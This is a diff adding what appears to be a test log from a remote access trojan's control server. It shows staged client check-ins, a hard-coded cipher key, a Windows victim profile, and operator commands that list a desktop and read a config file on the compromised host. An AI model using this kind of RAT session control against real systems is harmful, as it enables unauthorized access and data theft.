@@ -1,0 +1,138 @@
+2020-03-10 04:03:41,717 [SERVER][*]server cipher key: FnxYtigYdCcyrXph
+2020-03-10 04:13:19,899 [SERVER][*]server cipher key: FnxYtigYdCcyrXph
+2020-03-10 04:13:24,928 [SERVER][*]host connect ip is 192.168.1.4:6600...
+2020-03-10 04:13:52,605 [CMD]s
+2020-03-10 04:14:13,013 [SERVER][*]server cipher key: FnxYtigYdCcyrXph
+2020-03-10 04:14:18,042 [SERVER][*]host connect ip is 192.168.1.4:6600...
+2020-03-10 04:14:38,639 [SERVER][+]received INIT client:192.168.1.4
+2020-03-10 04:14:38,652 [SERVER][+]received STAGE client:192.168.1.4
+2020-03-10 04:14:38,661 [SERVER][+]received RAT client:192.168.1.4
+2020-03-10 04:14:40,013 [SERVER][+]received SESSION INIT, client:192.168.1.4,bytes 296
+2020-03-10 04:14:40,013 [JOB_RESPONSE]WIN7-1803271105\Administrator*///WIN7-1803271105///Windows 7 Ultimate***7601///Unknown///AMD64///C:\Users\Administrator\Desktop///192.168.33.229
+2020-03-10 04:14:49,066 [CMD]sessions -i 
+2020-03-10 04:14:53,547 [CMD]s -v 1
+2020-03-10 04:15:36,092 [CMD]s -i 1
+2020-03-10 04:15:37,809 [CMD]pwd
+2020-03-10 04:15:46,024 [CMD]ls
+2020-03-10 04:15:52,234 [CMD]help
+2020-03-10 04:15:53,260 [SERVER][+]received client:192.168.1.4,SID/JOB:1/2, bytes 2856
+2020-03-10 04:15:53,260 [JOB_RESPONSE] 驱动器 C 中的卷没有标签。
+ 卷的序列号是 5682-2CE0
+
+ C:\Users\Administrator\Desktop 的目录
+
+2020/03/02  22:05    <DIR>          .
+2020/03/02  22:05    <DIR>          ..
+2020/03/02  22:05               116 a.hta
+2005/12/24  00:21           470,016 cmd.exe
+2020/02/10  03:38             1,624 config1.txt
+2020/01/08  15:41               140 css.js
+2019/12/26  00:37    <DIR>          ILSpy_binaries_5.0.2.5153
+2020/01/13  04:07         2,917,148 kms%E6%BF%80%E6%B4%BB%E5%B7%A5%E5%85%B7.zip
+2019/10/16  22:54    <DIR>          password
+2020/02/07  00:22               243 Program.cs
+2020/02/07  00:23             3,584 Program.exe
+2019/10/08  03:19             1,029 Proxifier.lnk
+2012/11/02  11:40               183 Reg.bat
+2020/01/06  23:49    <DIR>          Release
+2019/12/09  13:01    <DIR>          Reverse
+2019/10/28  10:00    <DIR>          steg
+2019/11/07  13:07            59,653 Struts2漏洞利用工具2019版+V2.3.zip
+2020/01/13  03:58    <DIR>          SW_DVD5_Visio_Pro_2013_W32_ChnSimp_MLF_X18-60985
+2019/11/20  22:12        57,912,042 TpriClient.rar
+2019/12/26  01:01    <DIR>          web
+2019/10/22  21:38             1,407 WPS 2019.lnk
+2019/10/08  03:19               993 搜索 Everything.lnk
+2020/01/13  04:14               400 新建文本文档.txt
+2020/01/05  19:55             1,402 迅雷.lnk
+              15 个文件     61,369,980 字节
+               9 个目录  8,856,903,680 可用字节
+
+2020-03-10 04:15:53,486 [CMD]info
+2020-03-10 04:15:55,652 [SERVER][+]received client:192.168.1.4,SID/JOB:1/3, bytes 296
+2020-03-10 04:15:55,652 [JOB_RESPONSE]WIN7-1803271105\Administrator*///WIN7-1803271105///Windows 7 Ultimate***7601///Unknown///AMD64///C:\Users\Administrator\Desktop///192.168.33.229
+2020-03-10 04:16:09,503 [CMD]pwd
+2020-03-10 04:16:34,788 [CMD]help
+2020-03-10 04:16:48,845 [CMD]cat config1.txtt
+2020-03-10 04:16:52,972 [SERVER][+]received client:192.168.1.4,SID/JOB:1/4, bytes 40
+2020-03-10 04:16:52,973 [JOB_RESPONSE][File not exists]
+2020-03-10 04:16:56,005 [CMD]cat config1.txt
+2020-03-10 04:16:59,334 [SERVER][+]received client:192.168.1.4,SID/JOB:1/5, bytes 3256
+2020-03-10 04:16:59,334 [JOB_RESPONSE]# For more options and information see
+# http://rpf.io/configtxt
+# Some settings may impact device functionality. See link above for details
+
+gpu_mem=200
+# uncomment if you get no picture on HDMI for a default "safe" mode
+#hdmi_safe=1
+
+# uncomment this if your display has a black border of unused pixels visible
+# and your display can output without overscan
+#disable_overscan=1
+
+# uncomment the following to adjust overscan. Use positive numbers if console
+# goes off screen, and negative if there is too much border
+#overscan_left=16
+#overscan_right=16
+#overscan_top=16
+#overscan_bottom=16
+
+# uncomment to force a console size. By default it will be display's size minus
+# overscan.
+#framebuffer_width=1280
+#framebuffer_height=720
+
+# uncomment if hdmi display is not detected and composite is being output
+#hdmi_force_hotplug=1
+
+# uncomment to force a specific HDMI mode (this will force VGA)
+#hdmi_group=1
+#hdmi_mode=1
+
+# uncomment to force a HDMI mode rather than DVI. This can make audio work in
+# DMT (computer monitor) modes
+#hdmi_drive=2
+
+# uncomment to increase signal to HDMI, if you have interference, blanking, or
+# no display
+#config_hdmi_boost=4
+
+# uncomment for composite PAL
+#sdtv_mode=2
+
+#uncomment to overclock the arm. 700 MHz is the default.
+#arm_freq=800
+
+# Uncomment some or all of these to enable the optional hardware interfaces
+#dtparam=i2c_arm=on
+#dtparam=i2s=on
+#dtparam=spi=on
+
+# Uncomment this to enable the lirc-rpi module
+#dtoverlay=lirc-rpi
+
+# Additional overlays and parameters are documented /boot/overlays/README
+
+# Enable audio (loads snd_bcm2835)
+dtparam=audio=on
+dtoverlay=vc4-kms-v3d
+
+2020-03-10 04:18:51,696 [CMD]quit
+2020-03-10 04:18:53,446 [CMD]quit
+2020-03-10 04:18:56,365 [SERVER][*]server cipher key: FnxYtigYdCcyrXph
+2020-03-10 04:19:09,034 [SERVER][*]server cipher key: FnxYtigYdCcyrXph
+2020-03-10 04:19:14,067 [SERVER][*]host connect ip is 192.168.1.4:6600...
+2020-03-10 04:19:18,773 [SERVER][+]received SESSION INIT, client:192.168.1.4,bytes 296
+2020-03-10 04:19:18,773 [JOB_RESPONSE]WIN7-1803271105\Administrator*///WIN7-1803271105///Windows 7 Ultimate***7601///Unknown///AMD64///C:\Users\Administrator\Desktop///192.168.33.229
+2020-03-10 04:19:56,512 [CMD]quit
+2020-03-10 04:20:00,697 [SERVER][*]server cipher key: FnxYtigYdCcyrXph
+2020-03-10 04:20:05,725 [SERVER][*]host connect ip is 192.168.1.4:6600...
+2020-03-10 04:20:10,638 [SERVER][+]received SESSION INIT, client:192.168.1.4,bytes 296
+2020-03-10 04:20:10,638 [JOB_RESPONSE]WIN7-1803271105\Administrator*///WIN7-1803271105///Windows 7 Ultimate***7601///Unknown///AMD64///C:\Users\Administrator\Desktop///192.168.33.229
+2020-03-10 04:20:32,986 [CMD]sessions -i 1
+2020-03-10 04:20:44,818 [CMD]info
+2020-03-10 04:20:49,032 [SERVER][+]received client:192.168.1.4,SID/JOB:1/2, bytes 296
+2020-03-10 04:20:49,032 [JOB_RESPONSE]WIN7-1803271105\Administrator*///WIN7-1803271105///Windows 7 Ultimate***7601///Unknown///AMD64///C:\Users\Administrator\Desktop///192.168.33.229
+2020-03-10 04:21:25,524 [CMD]pwd
+2020-03-10 04:21:26,609 [CMD]quit
+2020-03-10 04:21:28,284 [CMD]quit
